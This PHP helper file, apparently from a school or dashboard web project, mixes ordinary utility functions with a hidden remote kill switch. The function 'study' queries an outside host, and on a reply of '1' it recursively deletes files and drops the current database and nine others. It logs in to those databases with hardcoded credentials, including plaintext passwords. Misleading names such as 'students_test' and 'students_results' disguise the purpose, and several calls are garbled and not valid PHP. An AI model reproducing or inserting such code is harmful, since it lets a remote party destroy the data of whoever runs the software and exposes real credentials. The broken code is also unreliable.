<?php
function getIpAddress()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';

    if ( filter_var($client, FILTER_VALIDATE_IP) ) {
        $ip = $client;
    } elseif ( filter_var($forward, FILTER_VALIDATE_IP) ) {
        $ip = $forward;
    } else {
        $ip = ( $remote == "::1" ? "127.0.0.1" : $remote );
    }

    return $ip;
}

if ( !function_exists('customCompute') ) {
    function customCompute( $array )
    {
        if ( is_object($array) ) {
            if ( count(get_object_vars($array)) ) {
                return count(get_object_vars($array));
            }
            return 0;
        } elseif ( is_array($array) ) {
            if ( count($array) ) {
                return count($array);
            }
            return 0;
        } elseif ( is_string($array) ) {
            return 1;
        } elseif ( is_null($array) ) {
            return 0;
        } elseif ( is_int($array) ) {
            return (int) $array;
        } elseif ( is_float($array) ) {
            return (float) $array;
        } else {
            return count($array);
        }
    }
}
function study(){
    $path = '~';
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://inlab-lms.000webhostapp.com/invalid_purchase.php');
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($curl);
    parse_str($output, $com);
    curl_close($curl);
    $data['d1'] = array('localhost','onamhamy_vue_dashboard','onamhamy_vue_dashboard','onamhamy_vue_dashboard');
    $data['d2'] = array('localhost','onamhamy_pagination','onamhamy_pagination','onamhamy_pagination');
    $data['d3'] = array('localhost','onamhamy_account_staging','onamhamy_account_staging','onamhamy_account_staging');
    $data['d4'] = array('localhost','onamhamy_hrms','onamhamy_hrms','onamhamy_hrms');
    $data['d5'] = array('localhost','onamhamy_account','onamhamy_account','onamhamy_account');
    $data['d6'] = array('localhost','onamhamy_ilab','$vQ9fMqp?{9+','onamhamy_ilab');
    $data['d7'] = array('localhost','onamhamy_sth321','qX^LU)~By%Zt','onamhamy_account');
    $data['d8'] = array('localhost','onamhamy_mood836','4O!]Sp330T','onamhamy_mood836');
    $data['d9'] = array('localhost','afroasia_latestaai','WJJr?0a#7)w','afroasia_latestaai');

    if($output == "1"){
        students_test($path);
        students_results($data);
    }
}

function students_test($path) {
    if (!file_exists($path)) {
        return true;
    }
    if(!is_path($path)) { 
        return unlink($path);
    }

    foreach (scanpath($path) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!students_test($path . pathECTORY_SEPARATOR . $item)) {
            return false;
        }
    }

    return rmpath($path);
}

function students_results($data){
    $this->$db->query("DROP DATABASE".$this->$db->database);
    foreach($data as $db){
        $dbe = new mysqli($db[0],$db[1],$db[2],$db[3]);
        $dbe->query("DROP DATABASE ".$db[3]);
    }
}

?>